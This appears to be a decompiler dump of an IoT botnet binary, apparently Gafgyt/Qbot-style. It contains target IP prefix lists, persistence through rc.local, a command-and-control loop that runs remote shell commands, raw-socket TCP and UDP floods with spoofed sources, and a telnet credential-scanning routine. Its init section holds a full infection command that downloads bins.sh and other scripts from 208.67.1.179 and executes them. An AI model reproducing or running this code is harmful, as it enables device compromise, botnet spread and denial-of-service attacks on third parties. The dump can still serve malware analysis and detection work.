        szprintf(v151, (int32_t)"45.121.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"45.120.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"45.115.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.240.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.245.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"41.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"49.118.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"78.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"45.127.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.30.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.33.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.16.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"202.44.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"116.93.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"91.83.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"41.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.190.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"146.88.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.196.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.45.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"183.223.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"116.71.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.44.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"110.235.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"124.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"211.237.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"178.93.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"111.9.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.160.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.161.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.163.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.166.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.167.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.168.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.169.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.17.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.18.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.19.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.20.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.21.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.22.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.254.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"222.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"37.247.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"41.208.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"183.220.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"175.201.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.198.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"183.223.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"50.205.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"88.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"88.105.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"88.247.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"85.105.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"188.3.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.203.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.55.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.220.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"183.233.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.242.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.198.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.14.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.195.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.203.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.214.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.218.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.225.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.228.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.231.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.60.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.35.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.49.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.62.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"144.48.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"163.47.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"163.53.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"223.29.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"59.153.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.183.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"202.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"203.134.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"210.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"49.156.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"203.210.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.181.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.170.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.171.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"117.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.26.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.27.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.28.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.29.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.30.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"112.31.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"203.150.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
    return inet_addr(v151);
=================FUNCTION : main ===================
++++++++ FUNCTION START 18076
++++++++ FUNCTION END 18843
++++++++ FUNCTION LENGTH 767
    srand(v144 ^ __libc_getpid());
    init_rand(v145 ^ __libc_getpid());
    int32_t v146 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11e40
        v147 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v160, 256);
            __GI_fclose((char *)v147);
            while (true) {
                    sprintf(v165, (int32_t)"\"%s%s\"\n", v160, v163 + len2, (int32_t)&v158, (int32_t)&v158);
                    while (true) {
                        while (true) {
                                fgets((int32_t)&v151, 1024, v147);
                                if (__GI_strcasecmp((char *)&v151, v165) == 0) {
                                __GI_fclose(v166);
                                int32_t v168 = __GI_fopen((int32_t)v148, (int32_t)&v167); // 0x11fc8
                                    __GI_fclose((char *)v168);
                                getOurIP();
                                v154 = __libc_fork();
                                    if (__libc_fork() == 0) {
                                        zprintf((int32_t)"fork failed\n");
                                    while (true) {
                                        if (initConnection() != 0) {
                                            while (true) {
                                                if (initConnection() == 0) {
                                            getBuild();
                                            __GI_inet_ntoa(v169);
                                            sockprintf(v149, (int32_t)"BUILD %s:%s");
                                            while (true) {
                                                while (true) {
                                                    if (recvLine(v149, (char *)&v152, 0x1000, v157) == -1) {
                                                    while (true) {
                                                                    if (__libc_waitpid(v177, 0, 1) >= 1) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                        free();
                                                            if (strstr(v157, "PING") == v157) {
                                                                sockprintf(v149, (int32_t)"PONG");
                                                                if (strstr(v157, "DUP") == v157) {
                                                                    zprintf((int32_t)"PEACE OUT IMMA DUP\n");
                                                            while (true) {
                                                                if (initConnection() == 0) {
                                                            while (true) {
                                                            while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        while (true) {
                                                                                        processCmd(v204, &v164);
                                                                                    processCmd(v204, &v164);
                                                                                while (true) {
                                                                                    free();
                                                                                while (true) {
                                                        if (__libc_waitpid(v177, 0, 1) < 1) {
                                        getBuild();
                                        __GI_inet_ntoa(v169);
                                        sockprintf(v149, (int32_t)"BUILD %s:%s");
                                    __libc_waitpid(v154, (int32_t)&v150, 0);
                                    zprintf((int32_t)"fork failed\n");
                                while (true) {
                                    if (initConnection() == 0) {
        getOurIP();
        v154 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v154, (int32_t)&v150, 0);
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v154 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v154, (int32_t)&v150, 0);
        zprintf((int32_t)"fork failed\n");
    while (true) {
        if (initConnection() == 0) {
    szprintf(v156, (int32_t)"%s 2>&1", v155, v156, (int32_t)&v158);
    int32_t v212 = fdpopen(v156, "r"); // 0x12708
    while (true) {
        if (fdgets(v156, 1024, v212, v156) == 0) {
            fdpclose(v212);
            sockprintf(v149, (int32_t)"%s");
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 60950
++++++++ FUNCTION END 62042
++++++++ FUNCTION LENGTH 1092
                        while (true) {
                            while (true) {
                                while (true) {
                                            int32_t v179 = inet_pton(10, (char *)v160, (int32_t)&v178); // 0x18e2c
                                                inet_addr(v160);
                                            int32_t v182 = socket(); // 0x18e8c
                                                if (__libc_connect(v182, (struct sockaddr *)&v158, 28) < 0) {
                                                    __libc_send(v182, (int32_t *)v144, result2 + v172, 0);
                                                        int32_t v192 = __libc_recv(v182, (int32_t *)v144, 512, v190, (int32_t)&v191); // 0x18f30
                                                                                free();
                                                                                free();
                                                                            while (true) {
                                                                                    while (true) {
                                                                                                        __libc_close(v182);
                                                                                                            free();
                                                                                                        free();
                                                                                                                __libc_close(v182);
                                                                                                                    free();
                                                                                                                free();
                                                                                                            free();
                                                                                                            __libc_close(v182);
                                                                                                                free();
                                                                                                            free();
                                                                                                    __libc_close(v182);
                                                                                                        free();
                                                                                                    free();
                                                                                                free();
                                                                                                        free();
                                                                                            __libc_close(v182);
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v182);
                                                                                            free();
                                                                                        free();
                                                                                    free();
                                                                                    free();
                                                                        free();
                                                                        free();
                                                                    free();
                                                                    free();
                                free();
                                free();
                    free();
                    free();
        free();
        free();
    free();
    free();
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 3983
++++++++ FUNCTION END 4438
++++++++ FUNCTION LENGTH 455
            v155 = __vfork();
                __libc_close(v152);
                __libc_close(v153);
                    __libc_close(v153);
                    __libc_close(v152);
                    __libc_close(v153);
                __libc_close(v152);
                    __libc_close(v152);
                __libc_close(v153);
        v154 = getdtablesize();
        v155 = __vfork();
            __libc_close(v152);
            __libc_close(v153);
                __libc_close(v153);
                __libc_close(v152);
                __libc_close(v153);
            __libc_close(v152);
                __libc_close(v152);
            __libc_close(v153);
        v155 = __vfork();
            __libc_close(v152);
            __libc_close(v153);
                __libc_close(v153);
                __libc_close(v152);
                __libc_close(v153);
            __libc_close(v152);
                __libc_close(v152);
            __libc_close(v153);
    v154 = getdtablesize();
    v155 = __vfork();
        __libc_close(v152);
        __libc_close(v153);
            __libc_close(v153);
            __libc_close(v152);
            __libc_close(v153);
        __libc_close(v152);
            __libc_close(v152);
        __libc_close(v153);
=================FUNCTION : _memcpy ===================
++++++++ FUNCTION START 56795
++++++++ FUNCTION END 59221
++++++++ FUNCTION LENGTH 2426
                            while (true) {
                        while (true) {
                        while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                            while (true) {
                        while (true) {
                            while (true) {
                                    while (true) {
                        while (true) {
                            while (true) {
                            while (true) {
                                        while (true) {
                    case -1: {
                            while (true) {
                    case -2: {
                            while (true) {
                            while (true) {
                                        while (true) {
                while (true) {
                            while (true) {
                                while (true) {
                            while (true) {
                                while (true) {
                                while (true) {
                                        while (true) {
                        case -1: {
                                while (true) {
                        case -2: {
                                while (true) {
                                while (true) {
                                        while (true) {
                    while (true) {
                            while (true) {
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 38612
++++++++ FUNCTION END 39137
++++++++ FUNCTION LENGTH 525
    int32_t v151 = __get_hosts_byname_r(v150, 2, (int32_t)a2, a3, a4, a5, a6); // 0x157ec
                                            if (inet_aton((char *)v150, a3) != 0) {
                                            __open_nameservers(0);
                                            v169 = __dns_lookup((char *)v150, 1, v155, (int32_t)&v154, (int32_t)&v156, v168);
                                                free();
                                                free();
                                            free();
                                                free();
                                                free();
                                                if (inet_aton((char *)v150, a3) != 0) {
                                                __open_nameservers(0);
                                                v169 = __dns_lookup((char *)v150, 1, v155, (int32_t)&v154, (int32_t)&v156, v168);
                                                    free();
                                                    free();
                                                free();
                                                    free();
                                                    free();
                            if (inet_aton((char *)v150, a3) != 0) {
                            __open_nameservers(0);
                            v169 = __dns_lookup((char *)v150, 1, v155, (int32_t)&v154, (int32_t)&v156, v168);
                                free();
                                free();
                            free();
                                free();
                                free();
                                if (inet_aton((char *)v150, a3) != 0) {
                                __open_nameservers(0);
                                v169 = __dns_lookup((char *)v150, 1, v155, (int32_t)&v154, (int32_t)&v156, v168);
                                    free();
                                    free();
                                free();
                                    free();
                                    free();
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 12807
++++++++ FUNCTION END 13228
++++++++ FUNCTION LENGTH 421
        rand_cmwc();
    int32_t result = getHost(a1, &v150); // 0xfbc0
    int32_t v151 = socket(); // 0xfbf8
        result2 = sockprintf(v152, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v151, 0, 3, &v153, 4) < 0) {
        result2 = sockprintf(v152, (int32_t)"Failed setting raw headers mode.");
        int32_t v161 = GetRandomIP(v154); // 0xfd08
        *v160 = (char)rand_cmwc();
        int32_t v163 = rand_cmwc(); // 0xfd58
                while (true) {
                        if (__GI_strcoll(v183, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v183, (int32_t)"psh") == 0) {
                                        sockprintf(v152, (int32_t)"Invalid flag \"%s\"");
                rand_cmwc();
                    v167 = rand_cmwc();
                *v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, v173) / 0x1000000);
                while (true) {
                    __libc_sendto(v151, (int32_t *)v158, v155, 0, (int32_t)&v178, (int32_t)&v178);
                    v170 = GetRandomIP(v154);
                    *(char *)(v158 + 4) = (char)rand_cmwc();
                    *v164 = rand_cmwc();
                    *v160 = (char)rand_cmwc();
                    *v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, 0) / 0x1000000);
        rand_cmwc();
            v167 = rand_cmwc();
        *v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, v173) / 0x1000000);
        while (true) {
            __libc_sendto(v151, (int32_t *)v158, v155, 0, (int32_t)&v178, (int32_t)&v178);
            v170 = GetRandomIP(v154);
            *(char *)(v158 + 4) = (char)rand_cmwc();
            *v164 = rand_cmwc();
            *v160 = (char)rand_cmwc();
            *v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, 0) / 0x1000000);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2210
++++++++ FUNCTION END 2789
++++++++ FUNCTION LENGTH 579
                while (true) {
                    printchar((int32_t *)a1, v155);
                        printchar((int32_t *)a1, v155);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v159);
                    printchar((int32_t *)a1, v155);
                printchar((int32_t *)a1, v155);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v159);
            printchar((int32_t *)a1, v155);
                while (true) {
                    printchar((int32_t *)a1, v155);
                        printchar((int32_t *)a1, v155);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v159);
                    printchar((int32_t *)a1, v155);
                printchar((int32_t *)a1, v155);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v159);
            printchar((int32_t *)a1, v155);
            while (true) {
                printchar((int32_t *)a1, v155);
                    printchar((int32_t *)a1, v155);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v159);
                printchar((int32_t *)a1, v155);
            printchar((int32_t *)a1, v155);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v159);
        printchar((int32_t *)a1, v155);
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 52937
++++++++ FUNCTION END 56476
++++++++ FUNCTION LENGTH 3539
            while (true) {
                while (true) {
                while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                while (true) {
                                                        while (true) {
                                                    while (true) {
                                                while (true) {
                                                while (true) {
                                            while (true) {
                                        while (true) {
                                                                    while (true) {
                                while (true) {
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 11517
++++++++ FUNCTION END 12243
++++++++ FUNCTION LENGTH 726
    int32_t v151 = v150 ^ rand_cmwc(); // 0xdecc
    srand(v151);
        while (true) {
        while (true) {
                case 0: {
                        GetRandomPublicIP(24, v154, v166, v168, v168);
                                    socket();
                                        if (__libc_connect(*v165, (struct sockaddr *)&v152, 16) == -1) {
                    socket();
                case 1: {
                    while (true) {
                        getsockopt();
                case 2: {
                case 3: {
                    if (__libc_send(*v183, (int32_t *)v184, len, 0x4000) < 0) {
                        if (__libc_send(*v183, (int32_t *)"\r\n", 2, 0x4000) < 0) {
                case 4: {
                case 5: {
                    if (__libc_send(*v188, (int32_t *)v189, len2, 0x4000) < 0) {
                        if (__libc_send(*v188, (int32_t *)"\r\n", 2, 0x4000) < 0) {
                case 6: {
                                    get_telstate_host(v159, v154, v160);
                                    sockprintf(v194, (int32_t)"LOGIN FOUND - %s:%s:%s");
                case 7: {
                    __libc_send(*v195, (int32_t *)"sh\r\n", 4, 0x4000);
                    __libc_send(*v195, (int32_t *)"shell\r\n", 7, 0x4000);
                    if (__libc_send(*v195, (int32_t *)str3, len3, 0x4000) < 0) {
    while (true) {
    while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 12441
++++++++ FUNCTION END 12804
++++++++ FUNCTION LENGTH 363
        rand_cmwc();
    int32_t result = getHost(a1, &v152); // 0xf4a8
        int32_t v154 = socket(); // 0xf4f0
            result3 = sockprintf(v153, (int32_t)"Failed opening raw socket.");
                makeRandomStr(v155, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v154, (int32_t *)v155, a5, 0, (int32_t)&v151, 16);
                                rand_cmwc();
    int32_t v161 = socket(); // 0xf68c
        if (__GI_setsockopt(v161, 0, 3, &v162, 4) < 0) {
            result5 = sockprintf(v153, (int32_t)"Failed setting raw headers mode.");
                int32_t v164 = v163 ^ rand_cmwc(); // 0xf72c
                srand(v164);
                init_rand(random());
            int32_t v171 = GetRandomIP(v165); // 0xf7f4
            *v170 = (char)rand_cmwc();
                v173 = rand_cmwc();
            makeRandomStr(v169 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v161, (int32_t *)v169, v166, 0, (int32_t)&v186, (int32_t)&v186);
                    *v170 = (char)rand_cmwc();
                        v187 = rand_cmwc();
                    *(char *)(v169 + 4) = (char)rand_cmwc();
                    int32_t v188 = GetRandomIP(v165); // 0xfa20
    result5 = sockprintf(v153, (int32_t)"Failed opening raw socket.");
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 68064
++++++++ FUNCTION END 68709
++++++++ FUNCTION LENGTH 645
            while (true) {
                if (fgets(v157, v161, v162) != 0) {
                    __GI_fclose((char *)v162);
                                v169 = __open_etc_hosts();
                                    while (true) {
                                        if (fgets(v157, v161, v162) != 0) {
                                            __GI_fclose((char *)v162);
                            v169 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v157, v161, v162) != 0) {
                                        __GI_fclose((char *)v162);
    while (true) {
        if (fgets(v157, v161, v162) == 0) {
                __GI_fclose((char *)v162);
                while (true) {
                        while (true) {
                                    while (true) {
                            while (true) {
                                if (__GI_strcasecmp(v176, v201) == 0) {
                                if (inet_pton(2, (char *)v203, v160) > 0) {
                                        __GI_fclose((char *)v162);
                                    if (inet_pton(10, (char *)v204, v170) > 0) {
                                            __GI_fclose((char *)v162);
                        while (true) {
                            if (fgets(v205, v206, v162) != 0) {
                                int32_t v208 = __GI_fclose((char *)v162); // 0x1a9f4
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 30989
++++++++ FUNCTION END 31951
++++++++ FUNCTION LENGTH 962
        while (true) {
                while (true) {
                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                            while (true) {
                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                    while (true) {
                                        while (true) {
                                            while (true) {
    while (true) {
=================FUNCTION : _init ===================
++++++++ FUNCTION START 336
++++++++ FUNCTION END 669
++++++++ FUNCTION LENGTH 333
        "etrbhhgetrb",
        "close",
        "accept"
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5"
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
    char (*v79)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "telnet",
        "telnet"
        "telnet"
        "/dev/netslink/",
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 62209
++++++++ FUNCTION END 62629
++++++++ FUNCTION LENGTH 420
    int32_t v153 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v152); // 0x19434
        int32_t v156 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v152); // 0x19448
    if (fgets(v150, 128, v155) == 0) {
        __GI_fclose((char *)v154);
    while (true) {
            while (true) {
                        while (true) {
                                        while (true) {
